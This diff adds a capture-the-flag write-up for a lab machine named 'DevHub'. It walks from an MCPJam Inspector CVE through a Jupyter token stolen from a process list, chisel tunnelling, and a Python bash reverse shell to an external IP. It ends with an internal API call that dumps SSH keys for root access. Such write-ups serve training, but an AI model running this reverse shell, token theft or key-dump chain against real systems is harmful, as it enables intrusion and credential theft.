@@ -1,0 +1,64 @@
+[Profile]{
+Machine: DevHub 
+ip: 10.129.5.139
+}
+
+[Enumeration]{
+nmap_full.txt ->22/tcp ssh,80/tcp http nginx,6274/tcp unknow --> mcp_jam
+Looking at http://devhub.htb, then http://devhub.htb:6274.
+On the port 6274, we see MCPJam and when going to the settings, we see it is version 1.4.2 (MCPJam Version: v1.4.2). --> CVE-2026-23744
+
+}
+
+[Exploitation]{
+The CVE-2026-23744 --> mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector
+Looking for ways to get to jupyter ( through port forwarding and getting token for token authentification ).
+```bash
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ cat /etc/passwd | grep /bin/bash
+<@mcpjam/inspector$ cat /etc/passwd | grep /bin/bash       
+root:x:0:0:root:/root:/bin/bash
+mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
+analyst:x:1002:1002::/home/analyst:/bin/bash
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ps aux | grep jupyter
+<de_modules/@mcpjam/inspector$ ps aux | grep jupyter       
+analyst     1076  0.0  2.4 182524 96552 ?        Ss   14:44   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root        1082  0.0  0.7  37376 28764 ?        Ss   14:44   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+mcp-dev     1670  0.0  0.0   6828  2196 pts/1    S+   16:36   0:00 grep --color=auto jupyter
+```
+
+With this, we got crucial informations: users, token, server.py is running through jupyter.
+The token is --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 .
+
+We set port forwarding with chisel
+```b ash
+chisel server --port 8080 --reverse #on my host
+
+Then I had to run the following commmand on the target machine nohup ./chisel client 10.10.14.63:8080 R:8888:localhost:8888 > /dev/null 2>&1 &
+but the target got no chisel, after many brainstorms trying to get the executable on internet, i upload my /bin/chisel on the target machine and it works ! :)
+Then I got the port forwarding just fine on my localhost.
+
+Then we use the token( a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ) we found to login in Jupyter.
+
+Haha, here we get python code execution through jupyter for the user analyst. 
+Let's get a reverse shell through python execution like you want ( simple command or through socket ).
+```python
+import os
+os.system('bash -c "bash -i>/dev/tcp/10.10.16.211/7777 0>&1"')
+```
+We got the reverse shell just fine and we even get the user.txt in the $HOME directory of analyst.
+
+
+}
+
+[PrivEsc]{ 
+When we looked services running, we noted the server.py( /opt/opsmcp/server.py ): This is like finding honey after climbing. So sweet !
+Use the API, the hidden tools, VALID_KEY ,... ha everything served on your plate. Isn't it sweet ?
+curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -X POST http://127.0.0.1:5000/tools/call \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
+
+Then we got the id_key that you sanitize well, give it good permissions, then use to ssh as root.
+
+Great !
+
+}
